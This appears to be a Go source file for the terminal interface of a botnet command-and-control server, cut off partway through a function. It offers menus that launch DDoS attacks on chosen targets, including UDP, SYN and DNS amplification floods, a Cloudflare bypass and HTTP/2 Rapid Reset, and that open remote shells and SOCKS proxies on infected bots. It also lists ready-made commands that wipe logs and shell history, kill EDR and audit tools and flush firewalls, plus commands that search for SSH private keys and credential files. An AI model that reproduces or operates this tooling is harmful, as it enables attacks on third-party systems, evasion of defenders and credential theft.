package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// ============================================================================
// ANSI COLOR CONSTANTS
// 256-color ANSI escape codes for terminal styling
// ============================================================================

const (
	// Neon colors
	ColorCyan      = "\033[38;5;51m"
	ColorCyanLight = "\033[38;5;87m"
	ColorCyanMid   = "\033[38;5;123m"
	ColorCyanPale  = "\033[38;5;159m"
	ColorCyanWhite = "\033[38;5;195m"
	ColorWhite     = "\033[38;5;231m"
	ColorMagenta   = "\033[38;5;201m"
	ColorRed       = "\033[38;5;196m"
	ColorGreen     = "\033[38;5;46m"
	ColorOrange    = "\033[38;5;214m"
	ColorGray      = "\033[38;5;245m"
	ColorDarkGray  = "\033[38;5;240m"
	ColorBlack     = "\033[38;5;0m"
	ColorBgBlack   = "\033[48;5;0m"

	// Purple gradient for eye banner
	ColorPurple1 = "\033[38;5;93m"
	ColorPurple2 = "\033[38;5;99m"
	ColorPurple3 = "\033[38;5;105m"
	ColorPurple4 = "\033[38;5;111m"
	ColorPurple5 = "\033[38;5;117m"
	ColorPurple6 = "\033[38;5;123m"
	ColorPurple7 = "\033[38;5;159m"
	ColorPurple8 = "\033[38;5;195m"

	// Reset
	ColorReset = "\033[0m"

	// Screen control
	ClearScreen = "\033[2J\033[H"
)

// ============================================================================
// LIPGLOSS STYLES (for Bubble Tea TUI)
// ============================================================================

var (
	// Base styles
	titleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("51")).
			Bold(true).
			Padding(0, 1)

	subtitleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("245")).
			Italic(true)

	boxStyle = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("201")).
			Padding(1, 2)

	activeBoxStyle = lipgloss.NewStyle().
			Border(lipgloss.DoubleBorder()).
			BorderForeground(lipgloss.Color("51")).
			Padding(1, 2)

	statusOnlineStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("46")).
				Bold(true)

	statusOfflineStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("196")).
				Bold(true)

	menuItemStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("252")).
			Padding(0, 2).
			MarginBottom(1)

	menuSelectedStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true).
				Padding(0, 3).
				MarginBottom(1)

	errorStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("196")).
			Bold(true)

	successStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("46")).
			Bold(true)

	headerStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("201")).
			Bold(true).
			BorderStyle(lipgloss.NormalBorder()).
			BorderBottom(true).
			BorderForeground(lipgloss.Color("240"))

	// Bot list styles
	botItemStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("231"))

	botSelectedStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true)
)

// ============================================================================
// BUBBLE TEA TUI MODEL
// ============================================================================

// ViewState represents the current screen/view
type ViewState int

const (
	ViewDashboard ViewState = iota
	ViewBotList
	ViewAttack
	ViewMethodSelect
	ViewSocks
	ViewHelp
	ViewRemoteShell
	ViewBroadcastShell
)

// Attack methods available - synced with bot/main.go
var attackMethods = []struct {
	name string
	desc string
	cmd  string
}{
	{"UDP Flood", "Layer 4 UDP volume attack", "!udpflood"},
	{"TCP Flood", "Layer 4 TCP connection flood", "!tcpflood"},
	{"HTTP GET", "Layer 7 GET request flood", "!http"},
	{"HTTPS/TLS", "Layer 7 encrypted flood", "!https"},
	{"CF Bypass", "Cloudflare UAM bypass", "!cfbypass"},
	{"Rapid Reset", "HTTP/2 CVE-2023-44487", "!rapidreset"},
	{"SYN Flood", "Raw SYN packet flood", "!syn"},
	{"ACK Flood", "ACK packet flood", "!ack"},
	{"GRE Flood", "GRE tunnel flood", "!gre"},
	{"DNS Amp", "DNS amplification attack", "!dns"},
}

// isL7Method checks if the attack method supports proxies
func isL7Method(cmd string) bool {
	return cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset"
}

// broadcastShortcut is a pre-built command for the broadcast shortcuts panel
type broadcastShortcut struct {
	name string
	desc string
	cmd  string
}

// Post-exploitation shortcuts — general quick actions
var postExShortcuts = []broadcastShortcut{
	{"Persist All", "Install cron/startup persistence", "!persist"},
	{"Reinstall All", "Force re-download bot binary", "!reinstall"},
	{"Flush Firewall", "Drop all iptables rules", "iptables -F && iptables -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT"},
	{"Kill Logging", "Stop syslog and clear logs", "service rsyslog stop 2>/dev/null; service syslog-ng stop 2>/dev/null; rm -rf /var/log/*.log /var/log/syslog /var/log/auth.log"},
	{"Clear History", "Wipe shell history + unset", "history -c; rm -f ~/.bash_history ~/.zsh_history; unset HISTFILE HISTSIZE"},
	{"Kill Monitors", "Stop common EDR/monitoring", "pkill -9 -f 'auditd|ossec|wazuh|falcon|sysdig|tcpdump|wireshark' 2>/dev/null"},
	{"Disable Cron", "Stop cron daemon (anti-cleanup)", "service cron stop 2>/dev/null; service crond stop 2>/dev/null"},
	{"Timestomp", "Set file timestamps to 2023", "find /tmp -maxdepth 1 -newer /etc/hostname -exec touch -t 202301010000 {} \\;"},
	{"DNS Flush", "Clear DNS resolver cache", "resolvectl flush-caches 2>/dev/null; systemd-resolve --flush-caches 2>/dev/null; nscd -i hosts 2>/dev/null"},
	{"Kill Sysmon", "Stop sysmon for linux", "service sysmonforlinux stop 2>/dev/null; pkill -9 sysmon 2>/dev/null"},
}

// Linux post-exploitation recon helpers
var linuxHelpers = []broadcastShortcut{
	{"System Info", "OS, kernel, hostname", "uname -a; cat /etc/*release 2>/dev/null | head -5; hostname"},
	{"Network Info", "Interfaces, routes, DNS", "ip -br a; ip route show default; cat /etc/resolv.conf 2>/dev/null | grep nameserver"},
	{"Open Ports", "Listening ports and PIDs", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"},
	{"Users w/ Shell", "Accounts with login shell", "grep -v -E 'nologin|false|sync|halt|shutdown' /etc/passwd"},
	{"SUID Binaries", "Find setuid executables", "find / -perm -4000 -type f 2>/dev/null"},
	{"Writable Dirs", "World-writable directories", "find / -writable -type d 2>/dev/null | grep -v proc | head -20"},
	{"Cron Jobs", "All scheduled tasks", "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null"},
	{"Docker/LXC", "Container environment check", "docker ps 2>/dev/null; lxc list 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5"},
	{"SSH Keys", "Find private keys on disk", "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null"},
	{"Credentials", "Config files with passwords", "grep -rl 'password\\|passwd\\|credential' /etc/ /opt/ /var/www/ 2>/dev/null | head -15"},
	{"Sudo Check", "Sudo permissions for user", "sudo -l 2>/dev/null; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'"},
	{"Proc Tree", "Running process tree", "ps auxf --width 200 2>/dev/null | head -30 || ps aux | head -30"},
	{"Kernel Version", "Kernel + possible exploits", "uname -r; cat /proc/version"},
	{"Mount Points", "Mounted filesystems", "mount | grep -v -E 'proc|sys|cgroup|tmpfs'"},
}

// TUIAttack tracks attacks launched from TUI mode
type TUIAttack struct {
	ID       int
	Method   string
	Target   string
	Port     string
	Duration time.Duration
	Start    time.Time
}

// Global TUI attack tracker
var (
	tuiAttacks     = []TUIAttack{}
	tuiAttackIDSeq = 0
)

// TUIModel is the main Bubble Tea model for the CNC interface
type TUIModel struct {
	// View state
	currentView ViewState
	width       int
	height      int

	// Dashboard data
	botCount    int
	totalRAM    int64
	totalCPU    int
	status      string
	attackCount int

	// Menu
	menuItems  []string
	menuCursor int

	// Bot list
	bots      []BotInfo
	botCursor int

	// Attack form
	attackTarget      string
	attackPort        string
	attackDuration    string
	attackMethod      string
	attackCmd         string
	attackProxyURL    string // Proxy URL for L7 methods (optional)
	attackCursor      int
	methodCursor      int
	attackInputActive bool // true when typing in a field
	attackViewMode    int  // 0 = launch, 1 = ongoing

	// Messages
	statusMessage string
	errorMessage  string

	// Toast notification (temporary, auto-expires)
	toastMessage string
	toastExpiry  time.Time

	// Launch animation
	launchAnimating  bool      // true during launch animation
	launchAnimStage  int       // current animation stage (0-4)
	launchAnimStart  time.Time // when animation started
	launchAnimMethod string    // attack method being launched
	launchAnimTarget string    // target IP
	launchAnimPort   string    // port
	launchAnimDur    string    // duration

	// Remote shell
	selectedBot        string // Bot ID for remote shell
	selectedBotArch    string
	shellInput         string
	shellOutput        []string // Output lines
	shellHistory       []string // Command history
	historyCursor      int
	shellScrollOffset  int // Lines scrolled up from bottom (0 = latest)

	// Broadcast targeting
	broadcastArch    string // Filter by architecture (empty = all)
	broadcastMinRAM  int64  // Minimum RAM in MB (0 = no filter)
	broadcastMaxBots int    // Max bots to target (0 = all)
	broadcastTab     int    // 0 = Command, 1 = Shortcuts, 2 = Linux
	shortcutCursor   int    // Cursor position in shortcuts/linux lists

	// Remote shell tabs (Shell / Linux helpers)
	remoteShellTab     int // 0 = Shell, 1 = Linux helpers
	remoteShortcutCur  int // Cursor in linux helpers list

	// Confirmation prompts
	confirmKill         bool   // Waiting for kill confirmation
	confirmPersist      bool   // Waiting for persist confirmation (broadcast)
	confirmReinstall    bool   // Waiting for reinstall confirmation (broadcast)
	confirmBroadcast    bool   // Waiting for generic broadcast confirmation
	pendingBroadcastCmd string // Command pending broadcast confirmation

	// Help section navigation
	helpSection int // Current help section (0-8)

	// Socks manager
	socksList      []SocksInfo
	socksCursor    int
	socksViewMode  int    // 0 = all, 1 = active, 2 = stopped
	socksInputMode bool   // true when setting port for a bot
	socksNewPort   string // Port to start socks on

	// Quit flag
	quitting bool
}

// BotInfo holds display information about a bot
type BotInfo struct {
	ID          string
	Arch        string
	IP          string
	RAM         int64
	CPU         int
	Uptime      time.Duration
	ProcessName string
	UplinkMbps  float64
	Country     string
	Selected    bool
}

// SocksInfo holds display information about a socks proxy on a bot
type SocksInfo struct {
	BotID     string    // Bot running the socks
	BotIP     string    // Bot's IP address (for connecting)
	Port      string    // Port socks is running on
	Status    string    // "active", "stopped"
	StartedAt time.Time // When socks was started
}

// TickMsg for periodic updates
type TickMsg time.Time

// ConnLogMsg for connection events
type ConnLogMsg struct {
	Arch      string
	Connected bool
}

// AttackLogMsg for attack events
type AttackLogMsg struct {
	Method   string
	Target   string
	Port     string
	Duration string
	Started  bool // true = attack started, false = attack ended
}

// ShellOutputMsg for receiving shell command output
type ShellOutputMsg struct {
	BotID  string
	Output string
}

// launchAnimTickMsg for the attack launch animation
type launchAnimTickMsg struct{}

// Init initializes the Bubble Tea model
func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		tickCmd(),
	)
}

func tickCmd() tea.Cmd {
	return tea.Tick(time.Second*2, func(t time.Time) tea.Msg {
		return TickMsg(t)
	})
}

// Update handles messages and updates the model
func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		return m.handleKeyPress(msg)

	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		return m, nil

	case TickMsg:
		// Refresh bot count and stats
		m.botCount = getBotCount()
		m.totalRAM = getTotalRAM()
		m.totalCPU = getTotalCPU()
		return m, tickCmd()

	case ConnLogMsg:
		// Toast notification for connection events
		var entry string
		if msg.Connected {
			entry = lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("▲") + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Render(msg.Arch) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("connected")
		} else {
			entry = lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("▼") + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Render(msg.Arch) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("disconnected")
		}
		m.toastMessage = entry
		m.toastExpiry = time.Now().Add(3 * time.Second)
		return m, nil

	case AttackLogMsg:
		// Toast notification for attack events
		var entry string
		neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
		neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
		neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
		neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
		neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))

		if msg.Started {
			entry = neonPink.Render("⚡") + " " +
				neonCyan.Render(msg.Method) + " " +
				neonYellow.Render(msg.Target+":"+msg.Port) + " " +
				neonGreen.Render("["+msg.Duration+"s]")
		} else {
			entry = neonRed.Render("■") + " " +
				neonCyan.Render(msg.Method) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("complete")
		}
		m.toastMessage = entry
		m.toastExpiry = time.Now().Add(4 * time.Second)
		return m, nil

	case ShellOutputMsg:
		// Add shell output to display
		if msg.Output != "" {
			lines := strings.Split(strings.TrimRight(msg.Output, "\n"), "\n")
			for _, line := range lines {
				m.shellOutput = append(m.shellOutput, line)
			}
			// Keep last 500 lines for scroll-back
			if len(m.shellOutput) > 500 {
				m.shellOutput = m.shellOutput[len(m.shellOutput)-500:]
			}
			// Auto-scroll to bottom if user is already at the bottom
			if m.shellScrollOffset == 0 {
				// Stay at bottom (no-op, offset already 0)
			} else {
				// User has scrolled up — keep their position, but adjust if
				// lines were trimmed from the front of the buffer.
				m.shellScrollOffset += len(lines)
				maxOffset := len(m.shellOutput) - 13
				if maxOffset < 0 {
					maxOffset = 0
				}
				if m.shellScrollOffset > maxOffset {
					m.shellScrollOffset = maxOffset
				}
			}
		}
		return m, nil

	case launchAnimTickMsg:
		// Progress the launch animation
		if m.launchAnimating {
			m.launchAnimStage++
			if m.launchAnimStage >= 8 {
				// Animation complete
				m.launchAnimating = false
				m.launchAnimStage = 0
				return m, nil
			}
			// Slower ticks, extra pause on final stage
			delay := 250 * time.Millisecond
			if m.launchAnimStage >= 5 {
				delay = 400 * time.Millisecond // Pause on "ATTACK LAUNCHED"
			}
			return m, tea.Tick(delay, func(t time.Time) tea.Msg {
				return launchAnimTickMsg{}
			})
		}
		return m, nil
	}

	return m, nil
}

func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	key := msg.String()

	// Handle shell input mode
	if m.currentView == ViewRemoteShell || m.currentView == ViewBroadcastShell {

		// Handle any active confirmation prompt first (y/n only)
		if m.confirmBroadcast || m.confirmPersist || m.confirmReinstall || m.confirmKill {
			switch key {
			case "y", "Y":
				if m.confirmKill && m.currentView == ViewRemoteShell {
					m.confirmKill = false
					m.shellInput = "!kill"
					return m.executeShellCommand()
				}
				if m.confirmBroadcast && m.currentView == ViewBroadcastShell {
					return m.executeBroadcastConfirmed()
				}
				if m.confirmPersist && m.currentView == ViewBroadcastShell {
					m.confirmPersist = false
					m.pendingBroadcastCmd = "!persist"
					m.confirmBroadcast = true
					return m, nil
				}
				if m.confirmReinstall && m.currentView == ViewBroadcastShell {
					m.confirmReinstall = false
					m.pendingBroadcastCmd = "!reinstall"
					m.confirmBroadcast = true
					return m, nil
				}
			case "n", "N", "esc":
				if m.confirmKill {
					m.confirmKill = false
					m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [kill cancelled]"))
				}
				m.confirmBroadcast = false
				m.confirmPersist = false
				m.confirmReinstall = false
				m.pendingBroadcastCmd = ""
			}
			return m, nil
		}

		// Remote shell: left/right switches tabs (Shell / Shortcuts / Linux)
		if m.currentView == ViewRemoteShell {
			if key == "left" {
				if m.remoteShellTab > 0 {
					m.remoteShellTab--
					m.remoteShortcutCur = 0
				}
				return m, nil
			}
			if key == "right" {
				if m.remoteShellTab < 2 {
					m.remoteShellTab++
					m.remoteShortcutCur = 0
				}
				return m, nil
			}
		}

		// Remote shell: shortcuts/linux tabs use cursor navigation
		if m.currentView == ViewRemoteShell && m.remoteShellTab > 0 {
			var list []broadcastShortcut
			if m.remoteShellTab == 1 {
				list = postExShortcuts
			} else {
				list = linuxHelpers
			}

			switch key {
			case "esc":
				m.currentView = ViewDashboard
				m.remoteShellTab = 0
				m.remoteShortcutCur = 0
				return m, nil
			case "up", "k":
				if m.remoteShortcutCur > 0 {
					m.remoteShortcutCur--
				}
				return m, nil
			case "down", "j":
				if m.remoteShortcutCur < len(list)-1 {
					m.remoteShortcutCur++
				}
				return m, nil
			case "enter":
				if m.remoteShortcutCur < len(list) {
					selected := list[m.remoteShortcutCur]
					m.shellInput = selected.cmd
					m.remoteShellTab = 0 // Switch back to shell to see output
					return m.executeShellCommand()
				}
				return m, nil
			}
			return m, nil
		}

		// Broadcast shell: left/right switches tabs (Command / Shortcuts)
		if m.currentView == ViewBroadcastShell {
			if key == "left" {
				if m.broadcastTab > 0 {
					m.broadcastTab--
					m.shortcutCursor = 0
				}
				return m, nil
			}
			if key == "right" {
				if m.broadcastTab < 1 {
					m.broadcastTab++
					m.shortcutCursor = 0
				}
				return m, nil
			}
		}

		// Broadcast shell: shortcuts tab uses cursor navigation + enter to execute
		if m.currentView == ViewBroadcastShell && m.broadcastTab == 1 {
			list := postExShortcuts

			switch key {
			case "esc":
				m.currentView = ViewDashboard
				m.broadcastTab = 0
				m.shortcutCursor = 0
				return m, nil
			case "up", "k":
				if m.shortcutCursor > 0 {
					m.shortcutCursor--
				}
				return m, nil
			case "down", "j":
				if m.shortcutCursor < len(list)-1 {
					m.shortcutCursor++
				}
				return m, nil
			case "enter":
				if m.shortcutCursor < len(list) {
					selected := list[m.shortcutCursor]
					m.shellInput = selected.cmd
					return m.executeShellCommand()
				}
				return m, nil
			case "ctrl+a":
				archs := []string{"", "x86_64", "aarch64", "arm", "mips", "mipsel"}
				currentIdx := 0
				for i, a := range archs {
					if a == m.broadcastArch {
						currentIdx = i
						break
					}
				}
				m.broadcastArch = archs[(currentIdx+1)%len(archs)]
				return m, nil
			case "ctrl+g":
				ramLevels := []int64{0, 512, 1024, 2048, 4096}
				currentIdx := 0
				for i, r := range ramLevels {
					if r == m.broadcastMinRAM {
						currentIdx = i
						break
					}
				}
				m.broadcastMinRAM = ramLevels[(currentIdx+1)%len(ramLevels)]
				return m, nil
			case "ctrl+n":
				maxLevels := []int{0, 10, 50, 100, 500}
				currentIdx := 0
				for i, n := range maxLevels {
					if n == m.broadcastMaxBots {
						currentIdx = i
						break
					}
				}
				m.broadcastMaxBots = maxLevels[(currentIdx+1)%len(maxLevels)]
				return m, nil
			}
			return m, nil
		}

		switch key {
		case "esc":
			m.currentView = ViewDashboard
			m.shellInput = ""
			m.broadcastTab = 0
			m.remoteShellTab = 0
			return m, nil
		case "enter":
			if m.shellInput != "" {
				return m.executeShellCommand()
			}
			return m, nil
		case "backspace":
			if len(m.shellInput) > 0 {
				m.shellInput = m.shellInput[:len(m.shellInput)-1]
			}
			return m, nil
		case "up":
			if len(m.shellHistory) > 0 && m.historyCursor > 0 {
				m.historyCursor--
				m.shellInput = m.shellHistory[m.historyCursor]
			}
			return m, nil
		case "down":
			if m.historyCursor < len(m.shellHistory)-1 {
				m.historyCursor++
				m.shellInput = m.shellHistory[m.historyCursor]
			} else {
				m.historyCursor = len(m.shellHistory)
				m.shellInput = ""
			}
			return m, nil
		case "pgup":
			// Scroll shell output up
			if m.currentView == ViewRemoteShell && m.remoteShellTab == 0 {
				m.shellScrollOffset += 5
				maxOffset := len(m.shellOutput) - 13
				if maxOffset < 0 {
					maxOffset = 0
				}
				if m.shellScrollOffset > maxOffset {
					m.shellScrollOffset = maxOffset
				}
			}
			return m, nil
		case "pgdown":
			// Scroll shell output down
			if m.currentView == ViewRemoteShell && m.remoteShellTab == 0 {
				m.shellScrollOffset -= 5
				if m.shellScrollOffset < 0 {
					m.shellScrollOffset = 0
				}
			}
			return m, nil
		case "ctrl+f":
			m.shellOutput = []string{}
			m.shellScrollOffset = 0
			return m, nil
		case "ctrl+p":
			if m.currentView == ViewBroadcastShell {
				m.confirmPersist = true
				return m, nil
			}
			m.shellInput = "!persist"
			return m.executeShellCommand()
		case "ctrl+r":
			if m.currentView == ViewBroadcastShell {
				m.confirmReinstall = true
				return m, nil
			}
			m.shellInput = "!reinstall"
			return m.executeShellCommand()
		case "ctrl+x":
			if m.currentView == ViewRemoteShell {
				m.confirmKill = true
			}
			return m, nil
		case "ctrl+a":
			if m.currentView == ViewBroadcastShell {
				archs := []string{"", "x86_64", "aarch64", "arm", "mips", "mipsel"}
				currentIdx := 0
				for i, a := range archs {
					if a == m.broadcastArch {
						currentIdx = i
						break
					}
				}
				m.broadcastArch = archs[(currentIdx+1)%len(archs)]
			}
			return m, nil
		case "ctrl+g":
			if m.currentView == ViewBroadcastShell {
				ramLevels := []int64{0, 512, 1024, 2048, 4096}
				currentIdx := 0
				for i, r := range ramLevels {
					if r == m.broadcastMinRAM {
						currentIdx = i
						break
					}
				}
				m.broadcastMinRAM = ramLevels[(currentIdx+1)%len(ramLevels)]
			}
			return m, nil
		case "ctrl+n":
			if m.currentView == ViewBroadcastShell {
				maxLevels := []int{0, 10, 50, 100, 500}
				currentIdx := 0
				for i, n := range maxLevels {
					if n == m.broadcastMaxBots {
						currentIdx = i
						break
					}
				}
				m.broadcastMaxBots = maxLevels[(currentIdx+1)%len(maxLevels)]
			}
			return m, nil
		default:
			if len(key) == 1 || key == "space" {
				if key == "space" {
					key = " "
				}
				m.shellInput += key
			}
			return m, nil
		}
	}

	// Handle text input mode for attack form
	if m.currentView == ViewAttack && m.attackInputActive {
		// Determine max field index (4 if L7 method selected, otherwise 3)
		maxField := 3
		if isL7Method(m.attackCmd) {
			maxField = 4 // Include proxy URL field
		}
		switch key {
		case "enter":
			m.attackInputActive = false
			// Auto-advance to next field
			if m.attackCursor < maxField {
				m.attackCursor++
				// Skip to proxy field (4) if it's L7 and we're past method (3)
				if m.attackCursor == 3 {
					// Method field - don't auto-activate input
				} else if m.attackCursor < maxField {
					m.attackInputActive = true // Keep editing next field
				} else if m.attackCursor == 4 && isL7Method(m.attackCmd) {
					m.attackInputActive = true // Proxy URL field
				}
			}
			return m, nil
		case "esc":
			m.attackInputActive = false
			return m, nil
		case "backspace":
			switch m.attackCursor {
			case 0:
				if len(m.attackTarget) > 0 {
					m.attackTarget = m.attackTarget[:len(m.attackTarget)-1]
				}
			case 1:
				if len(m.attackPort) > 0 {
					m.attackPort = m.attackPort[:len(m.attackPort)-1]
				}
			case 2:
				if len(m.attackDuration) > 0 {
					m.attackDuration = m.attackDuration[:len(m.attackDuration)-1]
				}
			case 4:
				if len(m.attackProxyURL) > 0 {
					m.attackProxyURL = m.attackProxyURL[:len(m.attackProxyURL)-1]
				}
			}
			return m, nil
		default:
			// Add character to current field
			if len(key) == 1 {
				switch m.attackCursor {
				case 0:
					m.attackTarget += key
				case 1:
					if key >= "0" && key <= "9" {
						m.attackPort += key
					}
				case 2:
					if key >= "0" && key <= "9" {
						m.attackDuration += key
					}
				case 4:
					m.attackProxyURL += key
				}
			}
			return m, nil
		}
	}

	// Handle socks input mode (just port input)
	if m.currentView == ViewSocks && m.socksInputMode {
		switch key {
		case "esc":
			m.socksInputMode = false
			m.socksNewPort = ""
			return m, nil
		case "enter":
			if m.socksNewPort != "" && m.socksCursor < len(m.bots) {
				// Send !socks command to the selected bot
				bot := m.bots[m.socksCursor]
				cmd := fmt.Sprintf("!socks %s", m.socksNewPort)
				sendToSingleBot(bot.ID, cmd)

				// Track it in socksList
				newSocks := SocksInfo{
					BotID:     bot.ID,
					BotIP:     bot.IP,
					Port:      m.socksNewPort,
					Status:    "active",
					StartedAt: time.Now(),
				}
				// Remove any existing entry for this bot
				for i, s := range m.socksList {
					if s.BotID == bot.ID {
						m.socksList = append(m.socksList[:i], m.socksList[i+1:]...)
						break
					}
				}
				m.socksList = append(m.socksList, newSocks)
				m.socksInputMode = false
				m.socksNewPort = ""
			}
			return m, nil
		case "backspace":
			if len(m.socksNewPort) > 0 {
				m.socksNewPort = m.socksNewPort[:len(m.socksNewPort)-1]
			}
			return m, nil
		default:
			if len(key) == 1 && key >= "0" && key <= "9" {
				m.socksNewPort += key
			}
			return m, nil
		}
	}

	switch key {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit

	case "esc":
		// Always go back to main menu
		m.currentView = ViewDashboard
		return m, nil

	case "q":
		if m.currentView == ViewDashboard {
			m.quitting = true
			return m, tea.Quit
		}
		m.currentView = ViewDashboard
		return m, nil

	case "up", "k":
		switch m.currentView {
		case ViewDashboard:
			if m.menuCursor > 0 {
				m.menuCursor--
			}
		case ViewBotList:
			if m.botCursor > 0 {
				m.botCursor--
			}
		case ViewAttack:
			if m.attackCursor > 0 {
				m.attackCursor--
			}
		case ViewMethodSelect:
			if m.methodCursor > 0 {
				m.methodCursor--
			}
		case ViewSocks:
			if !m.socksInputMode && m.socksCursor > 0 {
				m.socksCursor--
			}
		}

	case "down", "j":
		switch m.currentView {
		case ViewDashboard:
			if m.menuCursor < len(m.menuItems)-1 {
				m.menuCursor++
			}
		case ViewBotList:
			if m.botCursor < len(m.bots)-1 {
				m.botCursor++
			}
		case ViewAttack:
			// Max field is 4 (proxy URL) if L7 method, otherwise 3 (method)
			maxField := 3
			if isL7Method(m.attackCmd) {
				maxField = 4
			}
			if m.attackCursor < maxField {
				m.attackCursor++
			}
		case ViewMethodSelect:
			if m.methodCursor < len(attackMethods)-1 {
				m.methodCursor++
			}
		case ViewSocks:
			if !m.socksInputMode {
				// Determine max cursor based on view mode
				var maxLen int
				switch m.socksViewMode {
				case 0: // All Bots
					maxLen = len(m.bots)
				case 1: // Active Socks
					for _, sock := range m.socksList {
						if sock.Status == "active" {
							maxLen++
						}
					}
				case 2: // Stopped
					for _, sock := range m.socksList {
						if sock.Status == "stopped" {
							maxLen++
						}
					}
				}
				if m.socksCursor < maxLen-1 {
					m.socksCursor++
				}
			}
		}

	case "left":
		if m.currentView == ViewHelp {
			if m.helpSection > 0 {
				m.helpSection--
			}
		} else if m.currentView == ViewAttack && !m.attackInputActive {
			if m.attackViewMode > 0 {
				m.attackViewMode--
			}
		} else if m.currentView == ViewSocks {
			if m.socksViewMode > 0 {
				m.socksViewMode--
				m.socksCursor = 0
			}
		}

	case "right":
		if m.currentView == ViewHelp {
			if m.helpSection < 8 { // 9 sections: 0-8
				m.helpSection++
			}
		} else if m.currentView == ViewAttack && !m.attackInputActive {
			if m.attackViewMode < 1 {
				m.attackViewMode++
			}
		} else if m.currentView == ViewSocks {
			if m.socksViewMode < 2 {
				m.socksViewMode++
				m.socksCursor = 0
			}
		}

	case "enter":
		return m.handleEnter()

	case "s", "S":
		// Stop all attacks (in attack view, ongoing tab)
		if m.currentView == ViewAttack && m.attackViewMode == 1 {
			// Count and clear telnet attacks
			ongoingAttacksLock.Lock()
			count := len(ongoingAttacks)
			for k := range ongoingAttacks {
				delete(ongoingAttacks, k)
			}
			ongoingAttacksLock.Unlock()
			// Count and clear TUI attacks
			count += len(tuiAttacks)
			tuiAttacks = []TUIAttack{}

			sendToBots("!stop")
			neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
			neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
			m.toastMessage = neonRed.Render("🛑") + " " + neonGreen.Render(fmt.Sprintf("Stopped %d attack(s)", count))
			m.toastExpiry = time.Now().Add(3 * time.Second)
			return m, nil
		}
		// Start socks on selected bot (in socks view)
		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
			m.socksInputMode = true
			m.socksNewPort = "1080"
			return m, nil
		}

	case "x", "X":
		// Stop socks on selected bot (in socks view)
		if m.currentView == ViewSocks && !m.socksInputMode && m.socksCursor < len(m.bots) {
			bot := m.bots[m.socksCursor]
			// Send !stopsocks command
			sendToSingleBot(bot.ID, "!stopsocks")
			// Update status in socksList
			for i, sock := range m.socksList {
				if sock.BotID == bot.ID {
					m.socksList[i].Status = "stopped"
					break
				}
			}
			return m, nil
		}

	case "l", "L":
		// In help view, navigate sections
		if m.currentView == ViewHelp {
			if m.helpSection < 8 {
				m.helpSection++
			}
			return m, nil
		}
		// Launch attack
		if m.currentView == ViewAttack {
			return m.launchAttack()
		}

	case "h", "H":
		// In help view, navigate sections
		if m.currentView == ViewHelp {
			if m.helpSection > 0 {
				m.helpSection--
			}
		}

	case "tab":
		// In attack view, tab cycles through fields
		if m.currentView == ViewAttack {
			m.attackCursor = (m.attackCursor + 1) % 4
			return m, nil
		}
		// Otherwise cycle through views
		m.currentView = (m.currentView + 1) % 4
		return m, nil

	case "1":
		m.currentView = ViewDashboard
	case "2":
		m.currentView = ViewBotList
		m.refreshBotList()
	case "3":
		m.currentView = ViewAttack
	case "4":
		m.currentView = ViewHelp

	case "r":
		// Refresh
		m.botCount = getBotCount()
		m.totalRAM = getTotalRAM()
		m.totalCPU = getTotalCPU()
		if m.currentView == ViewBotList {
			m.refreshBotList()
		}
		m.statusMessage = "Refreshed"
	}

	return m, nil
}

func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
	switch m.currentView {
	case ViewDashboard:
		switch m.menuCursor {
		case 0: // Bots
			m.currentView = ViewBotList
			m.refreshBotList()
		case 1: // Attack Center
			m.currentView = ViewAttack
			m.attackViewMode = 0 // Start on launch tab
		case 2: // Broadcast Shell
			m.currentView = ViewBroadcastShell
			m.shellOutput = []string{}
			m.shellInput = ""
